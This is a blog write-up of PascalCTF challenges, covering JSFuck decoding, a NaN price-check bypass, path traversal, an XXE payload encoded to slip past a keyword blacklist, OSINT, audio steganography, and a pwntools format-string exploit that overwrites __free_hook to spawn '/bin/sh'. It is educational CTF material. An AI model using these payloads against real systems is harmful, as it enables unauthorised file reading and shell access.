<!DOCTYPE html>
<html lang="en" dir="auto" data-theme="auto">

<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>Pascal CTF | the008Ki11er</title>
<meta name="keywords" content="">
<meta name="description" content="PascalCTF is a cybersecurity event organized by high school students to attract other students to the world of CTFs. The categories included Miscellaneous, Cryptography, Web Security, Reverse Engineering, Artificial Intelligence and Binary Exploitation">
<meta name="author" content="">
<link rel="canonical" href="http://localhost:1313/writeups/ctfs/pascalctf/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.f0aeecef0c6bef020a9d5f83f42698478ee2a6e72d20fa4a1c2514cd7de8a85c.css" integrity="sha256-8K7s7wxr7wIKnV&#43;D9CaYR47ipuctIPpKHCUUzX3oqFw=" rel="preload stylesheet" as="style">
<link rel="icon" href="http://localhost:1313/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="en" href="http://localhost:1313/writeups/ctfs/pascalctf/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --code-block-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
                color-scheme: dark;
            }

            .list {
                background: var(--theme);
            }

            .toc {
                background: var(--entry);
            }
        }

        @media (prefers-color-scheme: light) {
            .list::-webkit-scrollbar-thumb {
                border-color: var(--code-bg);
            }
        }

    </style>
</noscript>
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.querySelector("html").dataset.theme = 'dark';
    } else if (localStorage.getItem("pref-theme") === "light") {
       document.querySelector("html").dataset.theme = 'light';
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.querySelector("html").dataset.theme = 'dark';
    } else {
        document.querySelector("html").dataset.theme = 'light';
    }

</script><meta property="og:url" content="http://localhost:1313/writeups/ctfs/pascalctf/">
  <meta property="og:site_name" content="the008Ki11er">
  <meta property="og:title" content="Pascal CTF">
  <meta property="og:description" content="PascalCTF is a cybersecurity event organized by high school students to attract other students to the world of CTFs. The categories included Miscellaneous, Cryptography, Web Security, Reverse Engineering, Artificial Intelligence and Binary Exploitation">
  <meta property="og:locale" content="en-us">
  <meta property="og:type" content="article">
    <meta property="article:section" content="writeups">
      <meta property="og:image" content="http://localhost:1313/papermod-cover.png">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="http://localhost:1313/papermod-cover.png">
<meta name="twitter:title" content="Pascal CTF">
<meta name="twitter:description" content="PascalCTF is a cybersecurity event organized by high school students to attract other students to the world of CTFs. The categories included Miscellaneous, Cryptography, Web Security, Reverse Engineering, Artificial Intelligence and Binary Exploitation">


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Writeups",
      "item": "http://localhost:1313/writeups/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "CTF",
      "item": "http://localhost:1313/writeups/ctfs/"
    }, 
    {
      "@type": "ListItem",
      "position":  3 ,
      "name": "Pascal CTF",
      "item": "http://localhost:1313/writeups/ctfs/pascalctf/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "Pascal CTF",
  "name": "Pascal CTF",
  "description": "PascalCTF is a cybersecurity event organized by high school students to attract other students to the world of CTFs. The categories included Miscellaneous, Cryptography, Web Security, Reverse Engineering, Artificial Intelligence and Binary Exploitation",
  "keywords": [
    
  ],
  "articleBody": "Web Challenges JSHit This was a straightforward challenge that included a JSFuck language. Just needed to decode the text. Used dcode.fr to decode the text and get the flag: ZazaStore This was an online marketplace. An interesting thing was that there was a FakeZa product which gave a fake flag, it hinted me that the real flag was RealZa product. Code Analysis:\n.\r├── challenge.zip\r└── src\r├── app\r│ ├── package.json\r│ ├── package-lock.json\r│ ├── public\r│ │ ├── images\r│ │ │ ├── CartoonZa.png\r│ │ │ ├── ElectricZa.jpeg\r│ │ │ ├── FakeZa.jpeg\r│ │ │ ├── RealZa.jpeg\r│ │ │ └── ZazaIsBad.png\r│ │ └── style\r│ │ └── style.css\r│ ├── server.js\r│ └── views\r│ ├── cart.ejs\r│ ├── index.ejs\r│ ├── inventory.ejs\r│ └── login.ejs\r├── docker-compose.yml\r└── Dockerfile The /add-cart function didnot validate the product so i noticed the logic flaw. Firstly i tried to exploit a logic flaw in how JavaScript handles NaN (Not-a-Number) during comparisons. The prices object only contains specific keys (FakeZa, ElectricZa, etc.). The /add-cart route does not check if the product we are adding is actually a valid item in the store.\nAdd the flag to cart: {\"product\": \"RealZa\", \"quantity\": 1}. Add a fake product that doesn’t exist in the prices object: {\"product\": \"Exploit\", \"quantity\": 1}. When we checkout, the code tries to calculate: prices[\"Exploit\"] * 1. Since prices[\"Exploit\"] is undefined, the math becomes undefined * 1, which results in NaN. total becomes NaN, the balance check is bypassed, and the items are added to the inventory. Travel Playlist The site takes the number 1 to 7 and fetches the song or video from youtube based on that index via /api/get_json\nVulnerability:\nThis challenge is a classic Path Traversal (or Directory Traversal) vulnerability. The description tells the flag is located at /app/flag.txt. I simply changed the index value with ../flag.txt which gave the flag. PDFile This challenge has a upload portal to upload .pasx (XML file extension) and convert it to PDF.\nCode Analysis:\n. ├── app.py ├── docker-compose.yml ├── Dockerfile ├── requirements.txt └── templates └── index.html The main logic and the major flaw is in this: The sanitize function checks the .pasx file if there are blacklist words, but it first converts each word to lowercase. We can bypass it by URL Encoding flag which becomes %66%6c%61%67 in the xml file.\nFirst we create a exploit.pasx file which includes \u003c?xml version=\"1.0\"?\u003e \u003c!DOCTYPE book [ \u003c!ENTITY xxe SYSTEM \"/app/%66%6c%61%67.txt\"\u003e ]\u003e \u003cbook\u003e \u003ctitle\u003e\u0026xxe;\u003c/title\u003e \u003cauthor\u003eTest\u003c/author\u003e \u003cchapters\u003e\u003c/chapters\u003e \u003c/book\u003e Upload it to the portal which will give flag in title Misc Geoguesser It is an OSINT challenge where we have to find the geolocation where the image was taken. Starting off with Google Images and Yandex. Firstly i tried to find the countries where the traffic delineator post like in the image (trying to pull off like Ranibolt) but it was too generic.\nThen I tried the buildings in the scene. It straight away gave away the location. Using google map to pinpoint location we found the exact place where image was taken: Stinky Slim This challenge gave us the audio of Brr Brr Patapim song from Italian brainrot meme. Analysing the audio using Sonic Analyser Spectrogram gave away the instruction to get the flag. OPEN A TICKET SAYING YOU LOVE BLAISE PASCAL TO GET THE FLAG PWN YetAnotherNoteTaker Binary analysis:\nThe binary has:\ncanary enabled meaning program crashes when it encounters stack overflows PIE disabled meaning the binary address doesn’t change Full RELRO indicates GOT(Global Offset Table) is not writable NX enabled indicates the binary is no execute enabled meaning we cannot inject shellcodes We are given these libc files: The binary has format string vulnerability: Because Full RELRO is enabled, we cannot overwrite the Global Offset Table (GOT). However, we can target Libc hooks (__free_hook), which are writable pointers within the libc library itself. Workflow Leak Libc address find libc base calculate offset find _free_hook address calculate system address which is used to trigger shell by overwriting _free_hook overwrite _free_hook with /bin/sh Trigger shell Leak:\nfrom pwn import * context.binary = elf = ELF('./notetaker') libc = ELF('./libs/libc.so.6') p=process('./notetaker') def write_note(data): p.sendlineafter(b'\u003e ', b'2') p.sendafter(b'note: ', data) def read_note(): p.sendlineafter(b'\u003e ', b'1') return p.recvline() write_note(b'AAAAAAAA'+b'%p.' * 50 + b'\\n') leaks = read_note().decode().split('.') for i, leak in enumerate(leaks): print(f\"Offset {i+1}: {leak}\") Buffer Offset is at index 8. Lets check for the libc and stack in gdb: Lets calculate offset: Exploit from pwn import * context.binary = elf = ELF('./notetaker') libc = ELF('./libs/libc.so.6') p = process('./notetaker') def write_note(data): p.sendlineafter(b'\u003e ', b'2') p.sendafter(b'note: ', data) def read_note(): p.sendlineafter(b'\u003e ', b'1') return p.recvline() def clear_note(): p.sendlineafter(b'\u003e ', b'3') #STEP 1: Leak libc write_note(b'%1$p\\n') leak = read_note().strip() libc_leak = int(leak, 16) log.info(f\"Leaked: {hex(libc_leak)}\") LEAK_OFFSET = 0x3c4b28 libc.address = libc_leak - LEAK_OFFSET log.success(f\"Libc base: {hex(libc.address)}\") # STEP 2: Calculate addresses free_hook = libc.sym['__free_hook'] system = libc.sym['system'] log.info(f\"__free_hook: {hex(free_hook)}\") log.info(f\"system: {hex(system)}\") # STEP 3: Overwrite __free_hook with system clear_note() BUFFER_OFFSET = 8 payload = fmtstr_payload(BUFFER_OFFSET, {free_hook: system}, write_size='short') write_note(payload + b'\\n') read_note() # STEP 4: Trigger free(\"/bin/sh\") -\u003e system(\"/bin/sh\") p.sendlineafter(b'\u003e ', b'/bin/sh\\x00') p.interactive() ",
  "wordCount" : "847",
  "inLanguage": "en",
  "image": "http://localhost:1313/papermod-cover.png","datePublished": "0001-01-01T00:00:00Z",
  "dateModified": "0001-01-01T00:00:00Z",
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "http://localhost:1313/writeups/ctfs/pascalctf/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "the008Ki11er",
    "logo": {
      "@type": "ImageObject",
      "url": "http://localhost:1313/favicon.ico"
    }
  }
}
</script>
</head>
<body id="top">
    
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header sticky-header">
    <nav class="nav">
        <div class="logo">
            <a href="http://localhost:1313/" accesskey="h" title="the008Ki11er (Alt + H)">the008Ki11er</a>
            <span class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
                <ul class="lang-switch"><li>|</li>
                </ul>
            </span>
        </div>
        <ul id="menu">
            <li>
                <a href="http://localhost:1313/about" title="About">
                    <span>About</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/writeups" title="Writeups">
                    <span>Writeups</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/projects" title="Projects">
                    <span>Projects</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/experience" title="Experience">
                    <span>Experience</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/search" title="Search (Alt &#43; /)" accesskey=/>
                    <span>Search</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/tags" title="Tags">
                    <span>Tags</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="http://localhost:1313/">Home</a>&nbsp;»&nbsp;<a href="http://localhost:1313/writeups/">Writeups</a>&nbsp;»&nbsp;<a href="http://localhost:1313/writeups/ctfs/">CTF</a></div>
    <h1 class="post-title entry-hint-parent">
      Pascal CTF
    </h1>
    <div class="post-description">
      PascalCTF is a cybersecurity event organized by high school students to attract other students to the world of CTFs. The categories included Miscellaneous, Cryptography, Web Security, Reverse Engineering, Artificial Intelligence and Binary Exploitation
    </div>
  </header> <div class="toc">
    <details >
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">‎ Table of Contents</span>
        </summary>

        <div class="inner"><ul>
                <li>
                    <a href="#web-challenges" aria-label="Web Challenges">Web Challenges</a><ul>
                        
                <li>
                    <a href="#jshit" aria-label="JSHit">JSHit</a></li>
                <li>
                    <a href="#zazastore" aria-label="ZazaStore">ZazaStore</a></li>
                <li>
                    <a href="#travel-playlist" aria-label="Travel Playlist">Travel Playlist</a></li>
                <li>
                    <a href="#pdfile" aria-label="PDFile">PDFile</a></li></ul>
                </li>
                <li>
                    <a href="#misc" aria-label="Misc">Misc</a><ul>
                        
                <li>
                    <a href="#geoguesser" aria-label="Geoguesser">Geoguesser</a></li>
                <li>
                    <a href="#stinky-slim" aria-label="Stinky Slim">Stinky Slim</a></li></ul>
                </li>
                <li>
                    <a href="#pwn" aria-label="PWN">PWN</a><ul>
                        
                <li>
                    <a href="#yetanothernotetaker" aria-label="YetAnotherNoteTaker">YetAnotherNoteTaker</a><ul>
                        
                <li>
                    <a href="#workflow" aria-label="Workflow">Workflow</a></li>
                <li>
                    <a href="#exploit" aria-label="Exploit">Exploit</a>
                </li>
            </ul>
            </li>
            </ul>
            </li>
            </ul>
        </div>
    </details>
</div>

  <div class="post-content"><h2 id="web-challenges">Web Challenges<a hidden class="anchor" aria-hidden="true" href="#web-challenges">#</a></h2>
<h3 id="jshit">JSHit<a hidden class="anchor" aria-hidden="true" href="#jshit">#</a></h3>
<p><img alt="jshit" loading="lazy" src="/writeups/ctfs/pascalctf/assets/jshit.png">
This was a straightforward challenge that included a JSFuck language. Just needed to decode the text.
<img alt="JSFusk Language" loading="lazy" src="/writeups/ctfs/pascalctf/assets/jsFusk.png"></p>
<p>Used <a href="https://www.dcode.fr/jsfuck-language">dcode.fr</a> to decode the text and get the flag:
<img alt="JSHit solve" loading="lazy" src="/writeups/ctfs/pascalctf/assets/jshitsolve.png"></p>
<h3 id="zazastore">ZazaStore<a hidden class="anchor" aria-hidden="true" href="#zazastore">#</a></h3>
<p><img alt="zazaStore" loading="lazy" src="/writeups/ctfs/pascalctf/assets/zazastore.png"></p>
<p>This was an online marketplace. An interesting thing was that there was a <code>FakeZa</code> product which gave a fake flag, it hinted me that the real flag was <code>RealZa</code> product.
<img alt="fake flag" loading="lazy" src="/writeups/ctfs/pascalctf/assets/zazaStore_fakeza.png"></p>
<p><strong>Code Analysis:</strong></p>
<pre tabindex="0"><code class="language-texttext" data-lang="texttext">.
├── challenge.zip
└── src
    ├── app
    │   ├── package.json
    │   ├── package-lock.json
    │   ├── public
    │   │   ├── images
    │   │   │   ├── CartoonZa.png
    │   │   │   ├── ElectricZa.jpeg
    │   │   │   ├── FakeZa.jpeg
    │   │   │   ├── RealZa.jpeg
    │   │   │   └── ZazaIsBad.png
    │   │   └── style
    │   │       └── style.css
    │   ├── server.js
    │   └── views
    │       ├── cart.ejs
    │       ├── index.ejs
    │       ├── inventory.ejs
    │       └── login.ejs
    ├── docker-compose.yml
    └── Dockerfile
</code></pre><p>The <code>/add-cart</code> function didnot validate the product so i noticed the logic flaw.
Firstly i tried to exploit a logic flaw in how JavaScript handles <code>NaN</code> (Not-a-Number) during comparisons.
The prices object only contains specific keys (FakeZa, ElectricZa, etc.). The <code>/add-cart</code> route does not check if the product we are adding is actually a valid item in the store.</p>
<ul>
<li>Add the flag to cart: <code>{&quot;product&quot;: &quot;RealZa&quot;, &quot;quantity&quot;: 1}</code>.
<img alt="RealZa" loading="lazy" src="/writeups/ctfs/pascalctf/assets/zazaStore_realza.png"></li>
<li>Add a fake product that doesn&rsquo;t exist in the prices object: <code>{&quot;product&quot;: &quot;Exploit&quot;, &quot;quantity&quot;: 1}</code>.
<img alt="Exploit" loading="lazy" src="/writeups/ctfs/pascalctf/assets/zazaStore_exploitza.png"></li>
<li>When we checkout, the code tries to calculate: <code>prices[&quot;Exploit&quot;] * 1</code>.</li>
<li>Since <code>prices[&quot;Exploit&quot;]</code> is undefined, the math becomes<code> undefined * 1</code>, which results in <code>NaN</code>.
<img alt="Total" loading="lazy" src="/writeups/ctfs/pascalctf/assets/zazaStore_total.png"></li>
<li><code>total</code> becomes <code>NaN</code>, the balance check is bypassed, and the items are added to the inventory.
<img alt="Flag" loading="lazy" src="/writeups/ctfs/pascalctf/assets/zazaStore_flag.png"></li>
</ul>
<h3 id="travel-playlist">Travel Playlist<a hidden class="anchor" aria-hidden="true" href="#travel-playlist">#</a></h3>
<p><img alt="Travel Playlist" loading="lazy" src="/writeups/ctfs/pascalctf/assets/travelPlaylist.png"></p>
<p>The site takes the number <code>1 to 7</code> and fetches the song or video from youtube based on that <code>index</code> via <code>/api/get_json</code></p>
<p><strong>Vulnerability:</strong><br>
This challenge is a classic Path Traversal (or Directory Traversal) vulnerability.
The description tells the flag is located at <code>/app/flag.txt</code>.
<img alt="Travel Playlist index" loading="lazy" src="/writeups/ctfs/pascalctf/assets/travelPlaylist_index.png"></p>
<p>I simply changed the index value with <code>../flag.txt</code> which gave the flag.
<img alt="Flag" loading="lazy" src="/writeups/ctfs/pascalctf/assets/travelPlaylist_flag.png"></p>
<h3 id="pdfile">PDFile<a hidden class="anchor" aria-hidden="true" href="#pdfile">#</a></h3>
<p><img alt="PDFile" loading="lazy" src="/writeups/ctfs/pascalctf/assets/pdfFile.png"></p>
<p>This challenge has a upload portal to upload <code>.pasx</code> (XML file extension) and convert it to PDF.</p>
<p><strong>Code Analysis:</strong></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">.
</span></span><span class="line"><span class="cl">├── app.py
</span></span><span class="line"><span class="cl">├── docker-compose.yml
</span></span><span class="line"><span class="cl">├── Dockerfile
</span></span><span class="line"><span class="cl">├── requirements.txt
</span></span><span class="line"><span class="cl">└── templates
</span></span><span class="line"><span class="cl">    └── index.html
</span></span></code></pre></div><p>The main logic and the major flaw is in this:
<img alt="Blacklist" loading="lazy" src="/writeups/ctfs/pascalctf/assets/pdfFile_blacklist.png"></p>
<p>The <code>sanitize</code> function checks the <code>.pasx</code> file if there are blacklist words, but it first converts each word to lowercase. We can bypass it by URL Encoding <code>flag</code> which becomes <code>%66%6c%61%67</code> in the xml file.</p>
<ul>
<li>First we create a <code>exploit.pasx</code> file which includes</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="cp">&lt;?xml version=&#34;1.0&#34;?&gt;</span>
</span></span><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE book [
</span></span></span><span class="line"><span class="cl"><span class="cp">&lt;!ENTITY xxe SYSTEM &#34;/app/%66%6c%61%67.txt&#34;&gt;</span>
</span></span><span class="line"><span class="cl">]&gt;
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">book</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span><span class="ni">&amp;xxe;</span><span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">author</span><span class="p">&gt;</span>Test<span class="p">&lt;/</span><span class="nt">author</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">chapters</span><span class="p">&gt;&lt;/</span><span class="nt">chapters</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">book</span><span class="p">&gt;</span>
</span></span></code></pre></div><ul>
<li>Upload it to the portal which will give flag in title
<img alt="alt text" loading="lazy" src="/writeups/ctfs/pascalctf/assets/pdfFile_flag.png"></li>
</ul>
<h2 id="misc">Misc<a hidden class="anchor" aria-hidden="true" href="#misc">#</a></h2>
<h3 id="geoguesser">Geoguesser<a hidden class="anchor" aria-hidden="true" href="#geoguesser">#</a></h3>
<p><img alt="geoguesser" loading="lazy" src="/writeups/ctfs/pascalctf/assets/geoguesser.png"></p>
<p>It is an OSINT challenge where we have to find the geolocation where the image was taken.
<img alt="challenge.png" loading="lazy" src="/writeups/ctfs/pascalctf/assets/geoguesser_challenge.png"></p>
<p>Starting off with <code>Google Images</code> and <code>Yandex</code>. Firstly i tried to find the countries where the traffic delineator post like in the image (trying to pull off like <code>Ranibolt</code>) but it was too generic.</p>
<p><img alt="road post" loading="lazy" src="/writeups/ctfs/pascalctf/assets/geoguesser_roadpost.png"></p>
<p>Then I tried the buildings in the scene.
<img alt="building" loading="lazy" src="/writeups/ctfs/pascalctf/assets/geoguesser_building.png"></p>
<p>It straight away gave away the location.
<img alt="Location" loading="lazy" src="/writeups/ctfs/pascalctf/assets/geoguesser_location.png">
Using google map to pinpoint location we found the exact place where image was taken:
<img alt="Cest La Vie Boutique, Malta" loading="lazy" src="/writeups/ctfs/pascalctf/assets/geoguesser_malta.png"></p>
<h3 id="stinky-slim">Stinky Slim<a hidden class="anchor" aria-hidden="true" href="#stinky-slim">#</a></h3>
<p><img alt="Stinky Slim" loading="lazy" src="/writeups/ctfs/pascalctf/assets/stinkySlim.png">
This challenge gave us the audio of <code>Brr Brr Patapim</code> song from Italian brainrot meme. Analysing the audio using <code>Sonic Analyser Spectrogram</code> gave away the instruction to get the flag.
<code>OPEN A TICKET SAYING YOU LOVE BLAISE PASCAL TO GET THE FLAG</code>
<img alt="Text" loading="lazy" src="/writeups/ctfs/pascalctf/assets/stinkySlim_solution.png"></p>
<h2 id="pwn">PWN<a hidden class="anchor" aria-hidden="true" href="#pwn">#</a></h2>
<h3 id="yetanothernotetaker">YetAnotherNoteTaker<a hidden class="anchor" aria-hidden="true" href="#yetanothernotetaker">#</a></h3>
<p><img alt="Notetaker" loading="lazy" src="/writeups/ctfs/pascalctf/assets/noteTaker.png"></p>
<p><strong>Binary analysis:</strong></p>
<p><img alt="Checksec" loading="lazy" src="/writeups/ctfs/pascalctf/assets/noteTaker_checksec.png"></p>
<p>The binary has:</p>
<ul>
<li><code>canary enabled</code> meaning program crashes when it encounters stack overflows</li>
<li><code>PIE disabled</code> meaning the binary address doesn&rsquo;t change</li>
<li><code>Full RELRO</code> indicates <code>GOT(Global Offset Table)</code> is not writable</li>
<li><code>NX enabled</code> indicates the binary is no execute enabled meaning we cannot inject shellcodes</li>
</ul>
<p>We are given these libc files:
<img alt="Libs" loading="lazy" src="/writeups/ctfs/pascalctf/assets/noteTaker_libs.png"></p>
<p>The binary has format string vulnerability:
<img alt="Vulnerability" loading="lazy" src="/writeups/ctfs/pascalctf/assets/noteTaker_formatString.png"></p>
<p>Because <code>Full RELRO</code> is enabled, we cannot overwrite the Global Offset Table (GOT). However, we can target Libc hooks (<code>__free_hook</code>), which are writable pointers within the libc library itself.
<img alt="Free Hook" loading="lazy" src="/writeups/ctfs/pascalctf/assets/noteTaker_freehook.png"></p>
<h4 id="workflow">Workflow<a hidden class="anchor" aria-hidden="true" href="#workflow">#</a></h4>
<ul>
<li>Leak Libc address</li>
<li>find libc base</li>
<li>calculate offset</li>
<li>find <code>_free_hook</code> address</li>
<li>calculate <code>system</code> address which is used to trigger shell by overwriting <code>_free_hook</code></li>
<li>overwrite <code>_free_hook</code> with <code>/bin/sh</code></li>
<li>Trigger shell</li>
</ul>
<p><strong>Leak:</strong></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./notetaker&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./libs/libc.so.6&#39;</span><span class="p">)</span>  
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">=</span><span class="n">process</span><span class="p">(</span><span class="s1">&#39;./notetaker&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">write_note</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt; &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;note: &#39;</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">read_note</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt; &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">write_note</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;AAAAAAAA&#39;</span><span class="o">+</span><span class="sa">b</span><span class="s1">&#39;%p.&#39;</span> <span class="o">*</span> <span class="mi">50</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">leaks</span> <span class="o">=</span> <span class="n">read_note</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">leak</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">leaks</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Offset </span><span class="si">{</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="si">}</span><span class="s2">: </span><span class="si">{</span><span class="n">leak</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span></code></pre></div><p><img alt="Leak" loading="lazy" src="/writeups/ctfs/pascalctf/assets/noteTaker_leak.png"></p>
<p><em><strong>Buffer Offset</strong></em> is at index 8. Lets check for the libc and stack in gdb:
<img alt="Libc and Stack" loading="lazy" src="/writeups/ctfs/pascalctf/assets/noteTaker_libcnstack.png"></p>
<p>Lets calculate offset:
<img alt="libs Offset" loading="lazy" src="/writeups/ctfs/pascalctf/assets/noteTaker_libcOffset.png"></p>
<h4 id="exploit">Exploit<a hidden class="anchor" aria-hidden="true" href="#exploit">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./notetaker&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./libs/libc.so.6&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./notetaker&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">write_note</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt; &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>
